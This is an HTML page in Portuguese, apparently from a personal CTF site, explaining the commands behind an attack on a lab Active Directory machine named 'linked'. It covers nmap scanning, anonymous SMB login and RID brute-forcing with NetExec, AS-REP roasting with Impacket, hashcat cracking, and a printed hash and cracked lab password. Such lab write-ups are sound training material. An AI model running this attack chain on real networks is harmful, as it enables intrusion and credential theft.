<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comandos Linked - Explicação</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .command {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 12px 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
        }
        
        .command-prefix {
            color: #50fa7b;
            margin-right: 10px;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        .image-container {
            width: 100%;
            margin: 20px 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border: 2px solid #115192;
        }
        
        .image-container img {
            width: 100%;
            display: block;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover img {
            transform: scale(1.02);
        }
        
        .image-caption {
            background: #115192;
            color: white;
            padding: 10px;
            text-align: center;
            font-size: 0.9rem;
        }
        
        .step {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            background-color: #115192;
            color: white;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-right: 15px;
        }
        
        .step-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background-color: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        
        th {
            background-color: #115192;
            color: white;
        }
        
        tr:hover {
            background-color: #f5f9ff;
        }
        
        .tool-explanation {
            background-color: white;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .tool-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .tool-icon {
            background: linear-gradient(135deg, #115192, #0a4b8f);
            width: 60px;
            height: 60px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.8rem;
        }
        
        .tool-title {
            color: #115192;
            margin: 0;
            font-size: 1.6rem;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
            
            .image-container {
                margin: 15px 0;
            }
            
            .tool-header {
                flex-direction: column;
                text-align: center;
            }
            
            .tool-icon {
                margin-right: 0;
                margin-bottom: 15px;
            }
        }
    </style>
</head>
<body>
    <a href="../CTF.php"><?php include('../seta.php'); ?></a>
    <div class="container">
        <header>
            <h1>COMANDOS LINKED</h1>
            <p class="subtitle">Explicação detalhada dos comandos utilizados</p>
        </header>
        
        <section class="intro">
            <h2>Análise de Comandos</h2>
            <p>Este documento explica os comandos e técnicas utilizadas durante a exploração de um sistema, conforme descrito no PDF fornecido. O foco está na explicação dos comandos, seus parâmetros e resultados.</p>
            
            <div class="highlight">
                <strong>Nota:</strong> Esta página não é um passo a passo, mas sim uma explicação detalhada dos comandos utilizados durante o processo.
            </div>
        </section>
        
        <section class="section">
            <h2>Ferramentas Utilizadas</h2>
            
            <div class="tool-explanation">
                <div class="tool-header">
                    <div class="tool-icon">
                        <i class="fas fa-network-wired"></i>
                    </div>
                    <h2 class="tool-title">Nmap</h2>
                </div>
                <p>Ferramenta de reconhecimento de rede usada para descobrir hosts e serviços em uma rede.</p>
                
                <div class="code">
                    nmap --min-rate 1000 -v -sVC 172.16.4.186
                </div>
                
                <h3>Parâmetros Explicados:</h3>
                <ul>
                    <li><code>--min-rate 1000</code>: Define que o Nmap deve enviar no mínimo 1000 pacotes por segundo, tornando o scan mais rápido</li>
                    <li><code>-v</code>: Modo verboso, mostra mais detalhes durante a execução</li>
                    <li><code>-sVC</code>: Executa detecção de versão (-sV) e executa scripts padrão (-sC) para coletar informações extras dos serviços</li>
                </ul>
                
                <div class="highlight">
                    <strong>Resultado esperado:</strong> O comando descobre portas abertas, versões de serviços e informações adicionais através dos scripts do Nmap.
                </div>
            </div>
            
            <div class="tool-explanation">
                <div class="tool-header">
                    <div class="tool-icon">
                        <i class="fas fa-share-alt"></i>
                    </div>
                    <h2 class="tool-title">NetExec (NXC)</h2>
                </div>
                <p>NetExec serve para testar protocolos de rede, como SMB que é um protocolo para compartilhar arquivos, pastas e impressoras em rede.
                ele pode executar comandos remotamente em máquinas Windows tipo um ssh
                Para isso você fornece: IP do alvo, Usuário, senha eComando que quer executar
                no comando ele tenta logar com usuário vazio e senha vazia (login anônimo)
                ai resulta em</p>
                
                <div class="code">
                    nxc smb 172.16.4.186 -u " " -p " "
                </div>
                
                <h3>Parâmetros Explicados:</h3>
                <ul>
                    <li><code>smb</code>: Especifica que o protocolo alvo é SMB</li>
                    <li><code>172.16.4.186</code>: IP do alvo</li>
                    <li><code>-u " "</code>: Tenta logar com usuário vazio (login anônimo)</li>
                    <li><code>-p " "</code>: Tenta logar com senha vazia</li>
                </ul>
                
                <div class="highlight">
                    <strong>Resultado obtido:</strong><br>
                    SMB 172.16.4.186 445 EC2AMAZ-E8IIAVC [+] linked.nclassas (Guest)<br>
                    SMB 172.16.4.186 445 EC2AMAZ-E8IIAVC [-] Error enumerating shares: STATUS_ACCESS_DENIED
                </div>
                
                <p>Isso significa que o SMB está ativo na porta 445, o NXC conseguiu identificar o sistema operacional, mas não teve permissão para enumerar os compartilhamentos.</p>
                
                <div class="code">
                    nxc smb 172.16.4.186 -u "as" -p "as" --shares
                </div>
                
                <h3>Parâmetros Adicionais:</h3>
                <ul>
                    <li><code>-u "as" -p "as"</code>: Tenta entrar com usuário e senha "as"</li>
                    <li><code>--shares</code>: Tenta listar pastas acessíveis via SMB</li>
                </ul>
                
                <div class="highlight">
                    <strong>Resultado obtido:</strong><br>
                    SMB 172.16.4.186 445 EC2AMAZ-E8IIAVC [+] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-E8IIAVC) (domain:linked.hc) (signing:True) (SMBv1:False)<br>
                    SMB 172.16.4.186 445 EC2AMAZ-E8IIAVC [+] linked.nclassas (Guest)<br>
                    SMB 172.16.4.186 445 EC2AMAZ-E8IIAVC [-] Error enumerating shares: STATUS_ACCESS_DENIED
                </div>
                
                <p>O NXC conseguiu logar e identificar informações do sistema, mas ainda não teve acesso aos compartilhamentos por estar logado como convidado.</p>
                
                <div class="code">
                    nxc smb 172.16.4.186 -u "Guest" -p " " --rid-brute
                </div>
                
                <h3>Parâmetros Adicionais:</h3>
                <ul>
                    <li><code>--rid-brute</code>: Realiza brute force de RIDs para descobrir todos os usuários e contas do sistema</li>
                </ul>
                
                <p>Este comando gerou uma lista de usuários e contas do sistema através da enumeração de RIDs.</p>
            </div>
            
            <div class="tool-explanation">
                <div class="tool-header">
                    <div class="tool-icon">
                        <i class="fas fa-user-secret"></i>
                    </div>
                    <h2 class="tool-title">Impacket-GetNPUsers</h2>
                </div>
                <p>Ferramenta que explora uma configuração fraca do Active Directory (AD), permitindo obter hashes de usuários sem precisar de senha.</p>
                
                <div class="code">
                    impacket-GetNPUsers -no-pass -usersfile users.txt linked.hc/
                </div>
                
                <h3>Parâmetros Explicados:</h3>
                <ul>
                    <li><code>-no-pass</code>: Não solicita senha durante a execução</li>
                    <li><code>-usersfile users.txt</code>: Arquivo contendo lista de usuários para teste</li>
                    <li><code>linked.hc/</code>: Domínio alvo do Active Directory</li>
                </ul>
                
                <div class="highlight">
                    <strong>Conceito importante:</strong> O Active Directory (AD) é um sistema do Windows que organiza usuários, permissões e recursos de rede.
                </div>
                
                <div class="highlight">
                    <strong>Resultado obtido:</strong> Hash TGT do usuário<br>
                    bba107dd6b9aa346d85718e292e85c33$39a6fe71193f011f0721ee097f16850cfd6dce16ed7c89a0e4c7ba780aa8e98c2540f58d81e54ed66ff09c6fdcff21060f0980141<br>
                    079ad58a75f78612723155f37712f25e177ca47fe1bc57b71057a3cd8887d400da19218ef222bc545ab97e416ec59824400dd35b35aa30e104831e2c00b5af0b9db8759861<br>
                    82242947bc158ab2251b5e88820d9631a957ebe05e703752810712852ffa35e16ec14d9aa93187334c8c5560ae5d909745580a5682129f9f9cd8abaa6dca3228274946eb79<br>
                    7e7e2bbeca2961bc36539dbde219da49267cf0418378a397097778d86cf399e2bf58cd7002c30ce
                </div>
            </div>
            
            <div class="tool-explanation">
                <div class="tool-header">
                    <div class="tool-icon">
                        <i class="fas fa-unlock-alt"></i>
                    </div>
                    <h2 class="tool-title">Hashcat</h2>
                </div>
                <p>Ferramenta avançada de recuperação de senhas, usada para quebrar hashes criptográficos.</p>
                
                <div class="code">
                    hashcat hash.txt /usr/share/wordlists/rockyou.txt
                </div>
                
                <h3>Parâmetros Explicados:</h3>
                <ul>
                    <li><code>hash.txt</code>: Arquivo contendo o hash a ser quebrado</li>
                    <li><code>/usr/share/wordlists/rockyou.txt</code>: Wordlist contendo possíveis senhas para teste (ataque de dicionário)</li>
                </ul>
                
                <div class="highlight">
                    <strong>Resultado obtido:</strong> Senha quebrada com sucesso<br>
                    little.dantas@LINKED.HC:3st4d0sun1d0SS**
                </div>
                
                <div class="code">
                    hashcat hash.txt /usr/share/wordlists/rockyou.txt --show
                </div>
                
                <h3>Parâmetros Adicionais:</h3>
                <ul>
                    <li><code>--show</code>: Mostra o resultado da quebra de hash (útil para confirmar resultados)</li>
                </ul>
                
                <p>Com a senha obtida, foi possível usar o NetExec novamente com credenciais válidas:</p>
                
                <div class="code">
                    nxc smb 172.16.4.186 -u 'little.dantas' -p '3st4d0sun1d0SS**' --shares
                </div>
                
                <p>Desta vez, com login e senha válidos, foi possível acessar os compartilhamentos SMB não como convidado, mas como usuário autenticado.</p>
            </div>
        </section>
        
        <section class="section">
            <h2>Tabela de Comandos e Funções</h2>
            
            <table>
                <tr>
                    <th>Comando</th>
                    <th>Ferramenta</th>
                    <th>Função Principal</th>
                    <th>Parâmetros-chave</th>
                </tr>
                <tr>
                    <td><code>nmap --min-rate 1000 -v -sVC</code></td>
                    <td>Nmap</td>
                    <td>Escaneamento de rede e serviços</td>
                    <td>--min-rate, -v, -sVC</td>
                </tr>
                <tr>
                    <td><code>nxc smb [IP] -u "" -p ""</code></td>
                    <td>NetExec</td>
                    <td>Teste de login anônimo SMB</td>
                    <td>smb, -u, -p</td>
                </tr>
                <tr>
                    <td><code>nxc smb [IP] --rid-brute</code></td>
                    <td>NetExec</td>
                    <td>Enumeração de usuários via RID</td>
                    <td>--rid-brute</td>
                </tr>
                <tr>
                    <td><code>impacket-GetNPUsers -no-pass</code></td>
                    <td>Impacket</td>
                    <td>Extrair hashes TGT do AD</td>
                    <td>-no-pass, -usersfile</td>
                </tr>
                <tr>
                    <td><code>hashcat [hash] [wordlist]</code></td>
                    <td>Hashcat</td>
                    <td>Quebra de hashes de senha</td>
                    <td>--show (para exibir resultados)</td>
                </tr>
            </table>
        </section>
        
        <section class="section">
            <h2>Resumo das Ferramentas</h2>
            
            <div class="cards-container">
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-network-wired"></i>
                        </div>
                        <h3>Nmap</h3>
                    </div>
                    <div class="card-content">
                        <p>Ferramenta essencial para reconhecimento de rede, descobrindo hosts e serviços em um sistema alvo.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-share-alt"></i>
                        </div>
                        <h3>NetExec (NXC)</h3>
                    </div>
                    <div class="card-content">
                        <p>Versátil ferramenta para testar protocolos de rede como SMB, executar comandos remotamente e enumerar usuários.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-user-secret"></i>
                        </div>
                        <h3>Impacket</h3>
                    </div>
                    <div class="card-content">
                        <p>Coleção de classes Python para trabalhar com protocolos de rede, explorando vulnerabilidades do Active Directory.</p>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-unlock-alt"></i>
                        </div>
                        <h3>Hashcat</h3>
                    </div>
                    <div class="card-content">
                        <p>Ferramenta avançada de recuperação de senhas, utilizando poder de CPU/GPU para quebrar hashes criptográficos.</p>
                    </div>
                </div>
            </div>
        </section>
        
        <footer>
            <p>Explicação de Comandos CTF linked</p>
        </footer>
    </div>
</body>
</html>